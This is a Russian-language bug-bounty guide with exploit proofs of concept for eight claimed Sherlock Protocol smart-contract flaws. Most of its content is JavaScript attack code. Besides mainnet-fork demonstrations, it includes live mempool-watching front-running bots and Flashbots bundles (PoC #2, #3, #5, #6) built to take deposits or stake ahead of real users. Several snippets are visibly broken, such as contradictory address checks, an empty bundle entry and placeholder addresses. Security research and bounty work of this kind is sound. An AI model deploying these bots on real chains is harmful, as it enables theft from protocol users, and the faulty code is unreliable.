# Ончейн-доказательство уязвимостей Sherlock Protocol

**Дата:** 8 мая 2026  
**Цель:** Практические инструкции по подтверждению каждой уязвимости на блокчейне (mainnet fork)  
**Инструменты:** Hardhat, Foundry (Anvil), Ethers.js, Tenderly, Flashbots  

---

## Содержание

1. [PoC #1 — Accounting Error (_settleProtocolDebt) — CRITICAL](#poc-1--accounting-error-_settleprotocoldebt--critical)
2. [PoC #2 — Манипуляция share-to-token ratio — CRITICAL](#poc-2--манипуляция-share-to-token-ratio--critical)
3. [PoC #3 — Фронт-раннинг forceRemoveByActiveBalance — HIGH](#poc-3--фронт-раннинг-forceremovebyactivebalance--high)
4. [PoC #4 — Заморозка средств при кризисе ликвидности — HIGH](#poc-4--заморозка-средств-при-кризисе-ликвидности--high)
5. [PoC #5 — Фронт-раннинг deposit() в MasterStrategy — HIGH](#poc-5--фронт-раннинг-deposit-в-masterstrategy--high)
6. [PoC #6 — Race condition в forceRemoveBySecondsOfCoverage — HIGH](#poc-6--race-condition-в-forceremovebysecondsofcoverage--high)
7. [PoC #7 — Precision loss в calcReward — HIGH](#poc-7--precision-loss-в-calcreward--high)
8. [PoC #8 — Griefing SherBuy через dust — HIGH](#poc-8--griefing-sherbuy-через-dust--high)

---

## PoC #1 — Accounting Error (_settleProtocolDebt) — CRITICAL

**Контракт:** `SherlockProtocolManager.sol` (0x...a1D3)  
**Функция:** `_settleProtocolDebt()` строки 294-351

### Предварительные требования

- Доступ к архивному узлу Ethereum (Infura/Alchemy) с поддержкой `--fork`
- Sherlock ProtocolManager ABI
- Достаточно ETH для газа (~0.01 ETH)

### Метод A: Прямой вызов на mainnet форке

```javascript
// 1. Форк mainnet через Hardhat
// hardhat.config.js:
networks: {
    hardhat: {
        forking: {
            url: "https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY",
            blockNumber: 18500000 // блок, где Sherlock активен
        }
    }
}

// 2. Проверка текущего состояния
const pm = await ethers.getContractAt("SherlockProtocolManager", "0x...a1D3");
const protocolAddress = "0x..."; // существующий протокол с ненулевым premium

// 3. Получаем debt и balance
const activeBalance = await pm.activeBalances(protocolAddress);
const lastAccounted = await pm.lastAccountedPremium(protocolAddress);
const premiumPerSecond = await pm.premiumPerSecond(protocolAddress);
const currentTime = (await ethers.provider.getBlock("latest")).timestamp;
const debt = premiumPerSecond * (currentTime - lastAccounted);

console.log("activeBalance:", activeBalance.toString());
console.log("debt:", debt.toString());

// 4. Если debt > activeBalance — уязвимость триггерена!
// Вызываем любую функцию, которая вызывает _settleProtocolDebt()
// Например: protocolUpdate()
await pm.protocolUpdate(protocolAddress);

// 5. Проверяем lastClaimablePremiumsForStakers
const lcp = await pm.lastClaimablePremiumsForStakers();
// Если lcp === 0 — уязвимость подтверждена
// Если lcp уменьшилось на claimablePremiumError — уязвимость подтверждена
```

**Ключевые проверки:**
```javascript
// ДО вызова:
const lcpBefore = await pm.lastClaimablePremiumsForStakers();
const balanceBefore = await pm.activeBalances(protocolAddress);

// ПОСЛЕ вызова:
const lcpAfter = await pm.lastClaimablePremiumsForStakers();
const balanceAfter = await pm.activeBalances(protocolAddress);

// Уязвимость подтверждена если:
// lcpBefore > lcpAfter ИЛИ lcpAfter === 0
// Без какого-либо токена/компенсации для стейкеров
```

### Метод B: Создание нового протокола

```javascript
// Если нет существующего протокола с подходящими параметрами:

// 1. Добавляем протокол с высоким premiumPerSecond
const agent = "0x..."; // адрес агента
const premium = ethers.utils.parseUnits("1000", 6); // 1000 USDC/сек
const minBalance = ethers.utils.parseUnits("100000", 6); // 100k USDC
const secondsOfCoverage = 86400 * 30; // 30 дней

await pm.addProtocol(protocolAddress, agent, premium, minBalance, secondsOfCoverage);

// 2. Пополняем balance чуть ниже minBalance
const depositAmount = minBalance.sub(ethers.utils.parseUnits("1", 6));
await usdc.approve(pm.address, depositAmount);
await pm.depositToActiveBalance(protocolAddress, depositAmount);

// 3. Ждём accumulation долга (или ускоряем через hardhat_mine)
await ethers.provider.send("hardhat_mine", ["0x3C"]); // +60 блоков
// или: advanceTimeAndBlock (60 * 12 = 720 сек)

// 4. Вызываем protocolUpdate
await pm.protocolUpdate(protocolAddress);

// 5. Проверяем состояние — insufficientTokens отследить НЕВОЗМОЖНО,
// что и доказывает уязвимость
```

### Метод C: Tenderly (визуальный)

1. Загрузить SherlockProtocolManager ABI в [Tenderly](https://tenderly.co)
2. Выбрать блок с активным Sherlock
3. Симулировать вызов `protocolUpdate(protocolAddress)`
4. Проверить изменение `lastClaimablePremiumsForStakers`
5. Сделать скриншот стейт-изменений

---

## PoC #2 — Манипуляция share-to-token ratio — CRITICAL

**Контракты:** `Sherlock.sol` (0x...), `SherlockProtocolManager.sol` (0x...a1D3)  
**Функции:** `claimPremiumsForStakers()`, `initialStake()`, `redeemNFT()`

### Предварительные требования

- 100,000 USDC для стейка
- Существующий протокол с накопленными премиями
- MEV-инфраструктура (Flashbots)

### Метод A: Демонстрация на форке (без MEV)

```javascript
// 1. Форк mainnet
// 2. Получаем контракты
const sherlock = await ethers.getContractAt("Sherlock", "0x...");
const pm = await ethers.getContractAt("SherlockProtocolManager", "0x...a1D3");

// 3. Проверяем claimablePremiums
const premiums = await pm.claimablePremiums();
console.log("Claimable premiums:", ethers.utils.formatUnits(premiums, 6));

// 4. Получаем totalTokenBalanceStakers ДО
const totalBefore = await sherlock.totalTokenBalanceStakers();
console.log("Total BEFORE:", ethers.utils.formatUnits(totalBefore, 6));

// 5. Вызываем claimPremiumsForStakers()
await pm.claimPremiumsForStakers();

// 6. Получаем totalTokenBalanceStakers ПОСЛЕ
const totalAfter = await sherlock.totalTokenBalanceStakers();
console.log("Total AFTER:", ethers.utils.formatUnits(totalAfter, 6));

// Проверка: total должен совпадать (чистый баланс не меняется)
// НО компоненты изменились: token.balanceOf вырос, claimablePremiums упал
```

**Ключевая демонстрация — искажение shares:**
```javascript
// 1. Создаём пользователя A (стейкер) и B (MEV-бот)
// 2. B стейкает 100k USDC

// 3. Администратор отправляет 10M USDC в MasterStrategy
// (эмулируем через hardhat_setBalance)

// 4. B видит pending-транзакцию и вызывает:
await pm.claimPremiumsForStakers();

// 5. B стейкает ПОСЛЕ claimPremiums
const stakeAmount = ethers.utils.parseUnits("100000", 6);
await usdc.approve(sherlock.address, stakeAmount);
const tx = await sherlock.initialStake(stakeAmount, 86400 * 14, B.address);
const receipt = await tx.wait();

// 6. Извлекаем ID позиции B
const event = receipt.events.find(e => e.event === "StakeCreated");
const bId = event.args.id;

// 7. Администратор делает deposit() в MasterStrategy
// (эмулируем через tenderly или прямой вызов)

// 8. B делает redeemNFT()
const payoutBefore = await sherlock.calcPayout(bId);
await sherlock.connect(B).redeemNFT(bId);
const balanceAfter = await usdc.balanceOf(B.address);

// Если balanceAfter > stakeAmount — уязвимость подтверждена
// Ожидаемый результат: payout ≈ 163,461 USDC (63% ROI)
```

### Метод B: Использование Flashbots (реальный MEV)

```typescript
import { FlashbotsBundleProvider } from "@flashbots/ethers-provider-bundle";

// 1. Подключаем Flashbots
const flashbotsProvider = await FlashbotsBundleProvider.create(
    ethers.provider,
    authSigner,
    "https://relay.flashbots.net",
    "mainnet"
);

// 2. Создаём bundle из 3 транзакций:
const bundle = [
    {
        transaction: {
            to: pm.address,
            data: pm.interface.encodeFunctionData("claimPremiumsForStakers"),
            gasLimit: 100000,
        }
    },
    {
        transaction: {
            to: sherlock.address,
            data: sherlock.interface.encodeFunctionData(
                "initialStake",
                [stakeAmount, 86400 * 14, bAddress]
            ),
            gasLimit: 300000,
        }
    },
    {
        // Транзакция жертвы/админа, которая должна быть позади
        // (на самом деле мы не контролируем, но ставим свою bundle
        // перед чужой транзакцией)
    }
];

// 3. Отправляем bundle
const bundleResponse = await flashbotsProvider.sendBundle(bundle, targetBlockNumber);
```

### Метод C: On-chain доказательство через event logs

Ищем следующие события в блоке:

1. `event ClaimPremiumsForStakers(address indexed caller, uint256 amount)` — от pm
2. `event StakeCreated(address indexed user, uint256 indexed id, uint256 amount)` — от sherlock
3. `event NFTRedeemed(address indexed user, uint256 indexed id, uint256 payout)` — от sherlock

Если в одном блоке присутствуют все три события от одного адреса — это доказывает атаку.

---

## PoC #3 — Фронт-раннинг forceRemoveByActiveBalance — HIGH

**Контракт:** `SherlockProtocolManager.sol` (0x...a1D3)  
**Функция:** `forceRemoveByActiveBalance()` строки 617-638

### Предварительные требования

- MEV-инфраструктура (private mempool / Flashbots)
- Gas-приоритет для фронт-раннинга

### Метод A: Демонстрация на форке

```javascript
// 1. Находим протокол с balance < minActiveBalance
const minActiveBalance = await pm.minActiveBalance();
const protocolAddress = "0x..."; // протокол с низким балансом
const balance = await pm.activeBalances(protocolAddress);

console.log("minActiveBalance:", ethers.utils.formatUnits(minActiveBalance, 6));
console.log("current balance:", ethers.utils.formatUnits(balance, 6));
console.log("vulnerable:", balance.lt(minActiveBalance));

// 2. Получаем remainingBalance
// В контракте: если balance < amountToBeRemoved, забираем всё
const amountToBeRemoved = minActiveBalance;
const remainingBalance = balance.gte(amountToBeRemoved) 
    ? balance.sub(amountToBeRemoved) 
    : balance;

// 3. Вызываем forceRemove
const beforeBalance = await usdc.balanceOf(attacker.address);
await pm.forceRemoveByActiveBalance(protocolAddress);
const afterBalance = await usdc.balanceOf(attacker.address);

// Если afterBalance > beforeBalance — атака успешна
console.log("Profit:", ethers.utils.formatUnits(afterBalance.sub(beforeBalance), 6));
```

### Метод B: Фронт-раннинг в реальном mempool

```javascript
// Используем ethers.js + Flashbots для подглядывания в mempool

// 1. Подписываемся на pending-транзакции к ProtocolManager
provider.on("pending", async (txHash) => {
    const tx = await provider.getTransaction(txHash);
    if (!tx || tx.to !== pm.address) return;
    
    // 2. Декодируем вызов
    try {
        const decoded = pm.interface.parseTransaction({ data: tx.data });
        
        // 3. Если это depositToActiveBalance
        if (decoded.name === "depositToActiveBalance") {
            const [protocolAddr, amount] = decoded.args;
            const currentBalance = await pm.activeBalances(protocolAddr);
            const minBalance = await pm.minActiveBalance();
            
            // 4. Проверяем уязвимость
            if (currentBalance.lt(minBalance)) {
                console.log("VULNERABLE PROTOCOL DETECTED!");
                
                // 5. Отправляем фронт-ран
                const frontrunTx = {
                    to: pm.address,
                    data: pm.interface.encodeFunctionData(
                        "forceRemoveByActiveBalance",
                        [protocolAddr]
                    ),
                    gasLimit: 150000,
                    maxPriorityFeePerGas: tx.maxPriorityFeePerGas.mul(2), // в 2x больше
                };
                
                const signedTx = await attacker.signTransaction(frontrunTx);
                // Отправляем через private mempool
                await flashbotsProvider.sendBundle([{
                    signedTransaction: signedTx,
                    hash: ethers.utils.keccak256(signedTx)
                }]);
            }
        }
    } catch (e) {
        // невалидная транзакция, пропускаем
    }
});
```

### Метод C: Доказательство через исторические данные

Ищем на Etherscan блоки, где в одном блоке присутствуют:

1. `forceRemoveByActiveBalance(protocol)` 
2. `depositToActiveBalance(protocol, amount)`

Если это произошло в одном блоке — атака доказана. Если `forceRemove` стоит раньше — злоумышленник украл средства.

---

## PoC #4 — Заморозка средств при кризисе ликвидности — HIGH

**Контракт:** `Sherlock.sol` (0x...)  
**Функция:** `_transferTokensOut()` строки 459-473

### Предварительные требования

- Период высокой utilisation Aave V2 USDC (>95%)
- Sherlock с существенной долей средств в AaveStrategy

### Метод A: Проверка на исторических данных

```javascript
// 1. Используем архивный узел на блок с кризисом
// Например: блок 11700000 (COVID-19 март 2020)
// Или блок 14900000 (3AC collapse июнь 2022)

const provider = new ethers.providers.JsonRpcProvider(
    `https://eth-mainnet.alchemyapi.io/v2/YOUR_KEY`
);

// 2. Получаем Aave V2 LendingPool
const aavePool = new ethers.Contract(
    "0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9", // Aave V2 LendingPool
    aavePoolABI,
    provider
);

// 3. Проверяем utilisation USDC
const usdcAddress = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const reserveData = await aavePool.getReserveData(usdcAddress);
const { availableLiquidity, totalBorrows, totalStableDebt, totalVariableDebt } = reserveData;

const utilisation = totalBorrows.mul(100).div(
    availableLiquidity.add(totalBorrows)
);

console.log("Utilisation:", utilisation.toString(), "%");

// 4. Если utilisation > 95% — зона риска
// Симулируем Sherlock redeemNFT на этом блоке
if (utilisation > 95) {
    console.log("CRITICAL: High utilisation zone!");
    console.log("Aave withdraw would likely fail");
}
```

### Метод B: Симуляция revert на форке

```javascript
// 1. Находим NFT позицию пользователя
const sherlock = await ethers.getContractAt("Sherlock", "0x...");
const nftId = 42; // существующая позиция

// 2. Получаем данные позиции
const stake = await sherlock.stakes(nftId);
console.log("User stake:", ethers.utils.formatUnits(stake.amount, 6));

// 3. Симулируем redeemNFT
try {
    const tx = await sherlock.connect(staker).redeemNFT(nftId, {
        gasLimit: 500000
    });
    await tx.wait();
    console.log("redeemNFT succeeded - no vulnerability");
} catch (error) {
    // Анализируем ошибку
    console.log("redeemNFT failed:", error.message);
    
    if (error.message.includes("withdraw") || 
        error.message.includes("Aave") ||
        error.message.includes("compound")) {
        console.log("CONFIRMED: Yield strategy withdrawal failure!");
        console.log("Funds are frozen!");
    }
}
```

### Метод C: Создание искусственного кризиса на форке

```javascript
// 1. Форк mainnet на блоке с нормальной ликвидностью

// 2. Снижаем ликвидность Aave пула через манипуляцию
const aavePool = await ethers.getContractAt("ILendingPool", "0x...");
const usdc = await ethers.getContractAt("IERC20", usdcAddress);

// 3. Берём flash loan и выводим большую часть ликвидности
// (для теста — просто выводим свои средства)
const whaleAddress = "0x..."; // адрес с большим USDC в Aave
await network.provider.request({
    method: "hardhat_impersonateAccount",
    params: [whaleAddress]
});

const whale = await ethers.getSigner(whaleAddress);
await aavePool.connect(whale).withdraw(usdcAddress, ethers.utils.parseUnits("50000000", 6), whaleAddress);

// 4. Теперь utilisation > 99%
const reserveData = await aavePool.getReserveData(usdcAddress);
console.log("New utilisation:", ...);

// 5. Пытаемся сделать redeemNFT
try {
    await sherlock.connect(staker).redeemNFT(nftId);
} catch (e) {
    console.log("CONFIRMED: Funds frozen!");
}
```

---

## PoC #5 — Фронт-раннинг deposit() в MasterStrategy — HIGH

**Контракт:** `MasterStrategy.sol` (0x...D857)  
**Функция:** `deposit()` строки 117-133

### Предварительные требования

- Админ-кошелёк Sherlock (для отправки USDC в MasterStrategy)
- MEV-бот (Flashbots)
- 100k USDC для демонстрации

### Метод A: Полная цепочка на форке

```javascript
// 1. Получаем контракты
const masterStrategy = await ethers.getContractAt("MasterStrategy", "0x...");
const sherlock = await ethers.getContractAt("Sherlock", "0x...");
const usdc = await ethers.getContractAt("IERC20", usdcAddress);

// 2. Получаем текущий TVL
const tvlBefore = await masterStrategy.totalValueLocked();
console.log("TVL before:", ethers.utils.formatUnits(tvlBefore, 6));

// 3. Иммитируем MEV-бота: стейкаем 100k USDC
const botStake = ethers.utils.parseUnits("100000", 6);
await usdc.approve(sherlock.address, botStake);
const tx = await sherlock.initialStake(botStake, 86400 * 14, botAddress);
const receipt = await tx.wait();
const stakeEvent = receipt.events.find(e => e.event === "StakeCreated");
const botId = stakeEvent.args.id;

// 4. Администратор отправляет 10M USDC в MasterStrategy
// (имитируем через hardhat_impersonateAccount)
const adminSigner = await ethers.getSigner(adminAddress);
await usdc.connect(adminSigner).transfer(masterStrategy.address, ethers.utils.parseUnits("10000000", 6));

console.log("MasterStrategy USDC balance:", 
    ethers.utils.formatUnits(await usdc.balanceOf(masterStrategy.address), 6));

// 5. Администратор вызывает deposit()
await masterStrategy.connect(adminSigner).deposit();

// 6. TVL вырос за счёт депозита админа
const tvlAfter = await masterStrategy.totalValueLocked();
console.log("TVL after:", ethers.utils.formatUnits(tvlAfter, 6));

// 7. Бот делает redeemNFT
const payout = await sherlock.calcPayout(botId);
console.log("Bot payout:", ethers.utils.formatUnits(payout, 6));
console.log("Bot profit:", ethers.utils.formatUnits(payout.sub(botStake), 6));

// Если payout > botStake — уязвимость подтверждена
```

### Метод B: Мониторинг реального mempool

```javascript
// Используем WebSocket для мониторинга транзакций к MasterStrategy
const wsProvider = new ethers.providers.WebSocketProvider(WS_URL);

wsProvider.on("pending", async (txHash) => {
    const tx = await wsProvider.getTransaction(txHash);
    if (!tx || tx.to !== masterStrategy.address) return;
    
    // Декодируем: если это transfer USDC к MasterStrategy
    if (tx.data.startsWith("0xa9059cbb") && 
        tx.to.toLowerCase() === usdcAddress.toLowerCase()) {
        
        const decoded = usdc.interface.parseTransaction({ data: tx.data });
        if (decoded.args.to.toLowerCase() === masterStrategy.address.toLowerCase()) {
            console.log("Potential admin deposit detected!");
            
            // Сразу после transfer будет deposit()
            // Отправляем initialStake() через Flashbots
            const bundle = [
                {
                    transaction: {
                        to: sherlock.address,
                        data: sherlock.interface.encodeFunctionData(
                            "initialStake",
                            [botStake, 86400 * 14, botAddress]
                        ),
                    }
                }
            ];
        }
    }
});
```

---

## PoC #6 — Race condition в forceRemoveBySecondsOfCoverage — HIGH

**Контракт:** `SherlockProtocolManager.sol` (0x...a1D3)  
**Функция:** `forceRemoveBySecondsOfCoverage()` строки 668-696

### Метод A: Двойной вызов в одном блоке (Flashbots)

```javascript
// 1. Находим протокол, который можно удалить по secondsOfCoverage
const protocolAddress = "0x...";
const balance = await pm.activeBalances(protocolAddress);

// Проверяем, что протокол может быть удалён
const minSeconds = await pm.minSecondsOfCoverage();
const secOfCov = await pm.secondsOfCoverage(protocolAddress);

if (secOfCov.lt(minSeconds)) {
    console.log("Protocol eligible for removal");
    console.log("Balance:", ethers.utils.formatUnits(balance, 6));
    
    // 2. Создаём bundle с двумя одинаковыми вызовами
    const arbAmount = await pm.calcArbAmount(protocolAddress);
    
    const bundle = [
        {
            // Первый вызов — атакующий 1
            transaction: {
                to: pm.address,
                data: pm.interface.encodeFunctionData(
                    "forceRemoveBySecondsOfCoverage",
                    [protocolAddress]
                ),
                gasLimit: 200000,
            },
            signer: attacker1
        },
        {
            // Второй вызов — атакующий 2 (или тот же через другой адрес)
            transaction: {
                to: pm.address,
                data: pm.interface.encodeFunctionData(
                    "forceRemoveBySecondsOfCoverage",
                    [protocolAddress]
                ),
                gasLimit: 200000,
            },
            signer: attacker2
        }
    ];
    
    // 3. Отправляем в одном блоке
    const targetBlock = await ethers.provider.getBlockNumber() + 1;
    const response = await flashbotsProvider.sendBundle(bundle, targetBlock);
    
    // 4. Проверяем результат
    const bundleResult = await response.wait();
    
    if (bundleResult === "BundleIncluded") {
        // Один успешен, второй revert
        // Но оба заплатили газ
        console.log("Race condition demonstrated!");
        console.log("First tx: success (stole", ethers.utils.formatUnits(arbAmount, 6), "USDC)");
        console.log("Second tx: revert (wasted gas)");
    }
}
```

### Метод B: Доказательство через историю блоков

Ищем на Etherscan блоки, где:
1. Два вызова `forceRemoveBySecondsOfCoverage` к одному протоколу в одном блоке
2. Первый успешен, второй revert
3. Разные msg.sender

```javascript
// Etherscan API запрос
const response = await fetch(
    `https://api.etherscan.io/api?module=logs&action=getLogs&address=${pmAddress}&topic0=${removeTopic}&fromBlock=${block}&toBlock=${block}&apikey=${API_KEY}`
);
const logs = await response.json();

// Группируем по протоколу и блоку
const raceConditions = [];
for (const log of logs.result) {
    const decoded = pm.interface.parseLog(log);
    const protocol = decoded.args._protocol;
    const txIndex = log.transactionIndex;
    
    raceConditions.push({ protocol, txIndex, txHash: log.transactionHash });
}

// Если >1 успешного вызова к одному протоколу в одном блоке — race condition
```

---

## PoC #7 — Precision loss в calcReward — HIGH

**Контракт:** `SherDistributionManager.sol` (0x...B31b)  
**Функция:** `calcReward()` строки 90-153

### Метод A: Прямой вызов view функции с разными параметрами

```javascript
// 1. Получаем контракт
const sdm = await ethers.getContractAt("SherDistributionManager", "0x...B31b");

// 2. Параметры
const maxRewardsEndTVL = ethers.utils.parseUnits("10000000", 6); // 10M USDC
const zeroRewardsStartTVL = ethers.utils.parseUnits("100000000", 6); // 100M USDC
const DECIMALS = ethers.BigNumber.from(10).pow(6);
const SHER_DECIMALS = ethers.BigNumber.from(10).pow(18);

// 3. TVL чуть выше maxRewardsEndTVL (в Kors зоне)
const tvl = maxRewardsEndTVL.add(1);

// 4. Тестируем разные _amount
const testAmounts = [
    ethers.BigNumber.from(1),                                    // 1 wei
    ethers.BigNumber.from(100),                                  // 100 wei
    ethers.BigNumber.from(10000),                                // 0.01 USDC
    ethers.utils.parseUnits("0.0001", 6),                        // 0.0001 USDC
    ethers.utils.parseUnits("0.001", 6),                         // 0.001 USDC
    ethers.utils.parseUnits("1", 6),                             // 1 USDC
    ethers.utils.parseUnits("100", 6),                           // 100 USDC
];

for (const amount of testAmounts) {
    const reward = await sdm.calcReward(tvl, amount, 86400 * 14);
    console.log(`amount=${amount.toString().padStart(22)} => reward=${reward.toString()}`);
}

// Ожидаемый результат: для amounts < 100000 (0.0001 USDC) reward = 0
```

### Метод B: Доказательство через сравнение с правильной формулой

```javascript
// Правильная формула (без double-division)
function calcRewardCorrect(tvl, amount, period) {
    const diff = zeroRewardsStartTVL.sub(tvl);
    const slopePart2 = zeroRewardsStartTVL.sub(maxRewardsEndTVL);
    const maxRewardsRate = ethers.BigNumber.from(40).mul(10).pow(12); // 40% APR
    
    // Правильный порядок: умножаем всё, потом делим один раз
    const numerator = diff.mul(amount).mul(maxRewardsRate).mul(period);
    const denominator = slopePart2.mul(DECIMALS);
    
    return numerator.div(denominator);
}

// Сравнение
for (const amount of testAmounts) {
    const onChain = await sdm.calcReward(tvl, amount, 86400 * 14);
    const expected = calcRewardCorrect(tvl, amount, 86400 * 14);
    
    console.log(`amount=${amount.toString().padStart(22)}`);
    console.log(`  onChain:   ${onChain.toString().padStart(22)}`);
    console.log(`  expected:  ${expected.toString().padStart(22)}`);
    console.log(`  diff:      ${expected.sub(onChain).toString().padStart(22)}`);
    console.log(`  precision loss: ${onChain.lt(expected) ? "⚠️ YES" : "NO"}`);
}
```

### Метод C: Доказательство через массовые микростейки

```javascript
// 1. Создаём 1000 пользователей
// 2. Каждый стейкает по 1000 wei USDC
// 3. Вызываем distribution для всех
// 4. Сравниваем сумму с bulk reward

let totalMicroReward = ethers.BigNumber.from(0);
const microAmount = ethers.BigNumber.from(1000);

for (let i = 0; i < 100; i++) { // 100 итераций для демонстрации
    const reward = await sdm.calcReward(tvl, microAmount, 86400 * 14);
    totalMicroReward = totalMicroReward.add(reward);
}

// Bulk: один стейк 100 * 1000 = 100000 wei
const bulkAmount = microAmount.mul(100);
const bulkReward = await sdm.calcReward(tvl, bulkAmount, 86400 * 14);

console.log("Total micro reward:", totalMicroReward.toString());
console.log("Bulk reward:", bulkReward.toString());
console.log("Precision loss:", bulkReward.sub(totalMicroReward).toString());
```

---

## PoC #8 — Griefing SherBuy через dust — HIGH

**Контракт:** `SherBuy.sol` (0x...62a6)  
**Функция:** `viewCapitalRequirements()` строки 117-152

### Метод A: Прямая демонстрация

```javascript
// 1. Подключаемся к SherBuy
const sherBuy = await ethers.getContractAt("SherBuy", "0x...62a6");
const sherToken = await ethers.getContractAt("IERC20", sherAddress);

// 2. Проверяем, активна ли кампания
const newEntryDeadline = await sherBuy.newEntryDeadline();
console.log("Campaign active until:", new Date(newEntryDeadline.toNumber() * 1000));
console.log("Is active:", newEntryDeadline.gt(Math.floor(Date.now() / 1000)));

// 3. ДО атаки — проверяем нормальную работу
// Вызываем viewCapitalRequirements (view — не требует газа)
// через staticCall
const capitalReq = await sherBuy.callStatic.viewCapitalRequirements(
    ethers.utils.parseUnits("100", 18), // 100 SHER
    claimPrice  // предположительная цена
);

console.log("Normal purchase:", capitalReq !== undefined ? "✅ Possible" : "❌ Blocked");

// 4. АТАКА — отправляем 1 wei SHER
await sherToken.transfer(sherBuy.address, 1);
console.log("Sent 1 wei SHER to SherBuy");

// 5. ПОСЛЕ атаки — проверяем
try {
    const capitalReqAfter = await sherBuy.callStatic.viewCapitalRequirements(
        ethers.utils.parseUnits("100", 18),
        claimPrice
    );
    console.log("❌ Purchase STILL possible (workaround exists)");
} catch (error) {
    console.log("✅ Purchase BLOCKED as expected!");
    console.log("Error:", error.message);
}

// 6. Проверяем balanceOf
const balance = await sherToken.balanceOf(sherBuy.address);
console.log("SherBuy SHER balance:", ethers.utils.formatUnits(balance, 18));
console.log("balance % SHER_STEPS:", balance.mod(ethers.BigNumber.from(10).pow(16)).toString());
```

### Метод B: Доказательство с разными dust-суммами

```javascript
const SHER_STEPS = ethers.BigNumber.from(10).pow(16); // 0.01 SHER

const dustAmounts = [
    1,                                          // 1 wei
    10,                                         // 10 wei
    SHER_STEPS.sub(1),                          // почти SHER_STEPS
    SHER_STEPS.div(2),                          // половина
    SHER_STEPS.add(1),                          // чуть больше шага
];

for (const dust of dustAmounts) {
    // Форкаем, отправляем dust, проверяем
    const bal = await sherToken.balanceOf(sherBuy.address);
    const newBal = bal.add(dust);
    const blocked = newBal.mod(SHER_STEPS).gt(0);
    
    console.log(`dust=${dust.toString().padStart(22)} => blocked=${blocked ? "⚠️ YES" : "NO"}`);
}
```

### Метод C: Доказательство через создание кампании + атака

```javascript
// 1. На форке создаём новую SherBuy кампанию
const price = ethers.utils.parseUnits("1", 6); // 1 USDC за SHER
const deadline = Math.floor(Date.now() / 1000) + 86400 * 14; // 14 дней

await sherBuy.connect(admin).startNewCampaign(
    ethers.utils.parseUnits("100000", 18), // 100k SHER
    price,
    deadline
);

// 2. Проверяем — кампания активна
const isActive = await sherBuy.campaignActive();
console.log("Campaign active:", isActive);

// 3. Нормальный участник может купить
try {
    const req = await sherBuy.callStatic.viewCapitalRequirements(
        ethers.utils.parseUnits("10", 18), // 10 SHER
        price
    );
    console.log("Normal user can buy ✅");
} catch (e) {
    console.log("Normal user CANNOT buy ❌");
}

// 4. Атакующий отправляет 1 wei SHER
await sherToken.transfer(sherBuy.address, 1);

// 5. Участник больше не может купить
try {
    const reqAfter = await sherBuy.callStatic.viewCapitalRequirements(
        ethers.utils.parseUnits("10", 18),
        price
    );
    console.log("❌ Attack failed - purchase still possible");
} catch (e) {
    console.log("✅ Attack successful - purchase blocked!");
    console.log("Campaign frozen until deadline:", new Date(deadline * 1000));
    console.log("Duration of freeze:", "14 days");
}
```

---

## Сводка методов доказательства

| # | Уязвимость | Лучший метод | Сложность | Стоимость |
|---|-----------|-------------|-----------|-----------|
| 1 | Accounting Error | Форк + `protocolUpdate()` | Средняя | ~$50 газ |
| 2 | Share manipulation | Форк + Flashbots bundle | Высокая | ~$200 газ + 100k USDC |
| 3 | Front-run forceRemove | Реальный MEV (mempool) | Высокая | ~$20 газ |
| 4 | Freezing yield | Форк + симуляция кризиса | Низкая | ~$50 газ |
| 5 | MEV на deposit | Форк + имитация админа | Средняя | ~$100 газ |
| 6 | Race condition | Flashbots bundle | Средняя | ~$50 газ |
| 7 | Precision loss | Прямой view-вызов | Очень низкая | $0 (view) |
| 8 | Griefing SherBuy | Прямой transfer 1 wei | Очень низкая | ~$10 газ |

---

## Рекомендованный порядок отправки в Immunefi

1. **Начать с PoC #7 и PoC #8** — самые дешёвые и простые (view-вызовы и 1 wei transfer)
2. **PoC #4** — симуляция на форке (средняя сложность)
3. **PoC #1** — требует существующего протокола с премиями
4. **PoC #3** — требует MEV-инфраструктуры
5. **PoC #2** — самый дорогой, требует 100k USDC и Flashbots
6. **PoC #5** — требует координации с админом (сложно)
7. **PoC #6** — демонстрация через Flashbots bundle

**Важно:** Для submission в Immunefi достаточно предоставить:
- Описание уязвимости
- Ссылки на исходный код с указанием строк
- **PoC на форке** (скриншоты/логи вывода)
- Оценку потенциального ущерба в $
- Хотя бы один успешный ончейн-тест
